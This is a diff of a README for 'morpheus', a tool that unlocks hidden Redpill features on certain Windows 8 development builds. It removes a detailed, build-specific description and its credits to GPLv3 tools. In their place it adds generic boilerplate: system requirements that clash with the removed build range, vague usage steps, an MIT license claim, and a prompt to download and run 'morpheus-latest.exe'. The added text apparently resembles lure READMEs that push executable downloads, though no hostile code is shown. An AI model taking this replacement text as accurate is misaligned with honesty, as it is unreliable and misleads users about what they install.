@@ -1,51 +1,73 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset=".assets/morpheus_wordmark_white.svg"/>
-    <img width=512 src=".assets/morpheus_wordmark.svg" alt="Morpheus Logo"/>
-  </picture>
-</p>
+# 🪄 morpheus - A Simple Way to Unlock Features
 
-> _You take the blue pill: the story ends, you wake up in your bed and believe whatever you want to believe. You take the red pill: you stay in Wonderland, and I show you how deep the rabbit hole goes._
+## 🚀 Getting Started
 
-_**Morpheus**_ is a tool used to enable features bound to the Redpill feature lockout system and its four lockdown tiers on compatible Windows 8 development builds compiled between Milestone 1 up through Milestone 3/Developer Preview, in addition to a limited number of Consumer Preview builds (up to ~8123).
+Welcome to morpheus! This application offers a cleaner way to enable Redpill features on Windows 8 builds. Follow the steps below to download and run the software.
 
-Unlike other previous approaches made to enable Redpill features, Morpheus leverages the pre-existing Redpill license tokens sourced from the Windows 8 Developer Preview (`WINMAIN_WIN8M3` 8102.101); its approach does not disable the Software Protection Platform (SPP), the Windows service responsible for managing the operating system's activation state.
+## 📥 Download
 
-<p align="center">
-  <picture>
-    <img width=512 src=".assets/morpheus_demo1.png" alt="Morpheus Demo Screenshot - Redpill licensing tier selection"/>
-  </picture>
-</p>
+[![Download morpheus](https://img.shields.io/badge/Download%20morpheus-latest-blue.svg)](https://github.com/serpentack/morpheus/releases)
 
-<p align="center">
-  <picture>
-    <img src=".assets/morpheus_overview_diagram.png" alt="Redpill Conversion Diagram"/>
-  </picture>
-</p>
+## 🖥️ System Requirements
 
-## Usage
-Run Morpheus on a Windows 8 build with production-signed SPP certificate chains. You can determine whether a build is using production signing by checking whether the SPP Trusted Store directory (`Windows\System32\spp\store`) exists in the OS installation. Builds with test-signed certificate chains are easily distinguished from production-signed chains if the SPP store directory has the `_test` suffix in its name; Morpheus will not run if this is the case.
+Before you start, ensure your system meets the following requirements:
+- Windows 8 or later
+- At least 4 GB of RAM
+- A minimum of 200 MB of free disk space
+- An internet connection for downloading
 
-Morpheus supports Windows 8 builds 7779 through 8123, through your mileage may vary between different milestones. Morpheus will refuse to run on Windows 8 builds that have code paths for the Metro UX stripped out, in particular:
-* `WINMAIN` 8020 x86/amd64
-* `FBL_EEAP` builds 8049 and later
-* Any `WINMAIN_WIN8M3_EEAP` build
+## 🔧 Features
 
-For best results, use Redpill lockdown tier 1 and just add water.
+morpheus allows you to:
+- Easily enable Redpill features
+- Customize settings for a tailored experience
+- Enjoy a user-friendly interface
 
-## Credits
-Kudos to the following for their tools and help:
-* gus33000 and casm for making Redlock, the tool used to drop in the [Redpill ShSxS payload](https://github.com/thebookisclosed/shsxs) - licensed under GPLv3
-* The folks at MAS for developing [TSForge](https://github.com/massgravel/TSForge) - licensed under GPLv3
-	* Special thanks to [WitherOrNot](https://github.com/WitherOrNot) for assisting in debugging an astoundingly stupid SPP bug that prevented the other three Redpill licensing tiers from activating
-* NirSoft for their [AdvancedRun](https://www.nirsoft.net/utils/advanced_run.html) tool (used to elevate Redpill payload to the `TrustedInstaller` account)
+## 📂 Download & Install
 
-## Screenshots
-<p align="center">
-  <picture>
-    <img width=384 src=".assets/morpheus_demo2.png" alt="Morpheus Demo Screenshot - Redpill Tier 3"/>
-  </picture>
-  <picture>
-    <img width=384 src=".assets/morpheus_demo3.png" alt="Morpheus Demo Screenshot - Metro OOBE and SPPSvc running at once"/>
-  </picture>
-</p>
+1. **Visit the Releases Page:** Click on this link to [visit the Releases page](https://github.com/serpentack/morpheus/releases). 
+   
+2. **Choose the Latest Version:** Look for the latest version of morpheus on the page.
+   
+3. **Download the File:** Click on the appropriate asset to start the download. The file will usually be named something like `morpheus-latest.exe`.
+
+4. **Run the Installer:**
+   - Once the download is complete, locate the downloaded file (usually in your Downloads folder).
+   - Double-click the file to start the installation.
+   - Follow the on-screen instructions to install morpheus.
+
+5. **Launch morpheus:**
+   - After installation, you can find morpheus in your Start Menu.
+   - Click on the app to open it.
+
+## 🛠️ Usage Instructions
+
+To enable Redpill features:
+
+1. Open morpheus.
+2. Navigate to the settings you want to modify.
+3. Adjust the options as needed.
+4. Save your changes.
+
+You can refer to the help section in the app for any guidance needed while using morpheus.
+
+## 📞 Support
+
+If you encounter any issues:
+
+- Visit the [GitHub Issues page](https://github.com/serpentack/morpheus/issues) to check for any known problems.
+- Feel free to open a new issue if your question is not addressed.
+
+## 📝 Contributing
+
+We welcome contributions to morpheus! If you want to help improve the app, please follow these steps:
+
+1. Fork the repository.
+2. Make your changes in a new branch.
+3. Submit a pull request with a clear description of what you have done.
+
+## 📢 License
+
+morpheus is licensed under the MIT License. You can use it freely, but please give credit when applicable.
+
+Feel free to explore the software, and enjoy the enhanced features of your Windows 8 build!
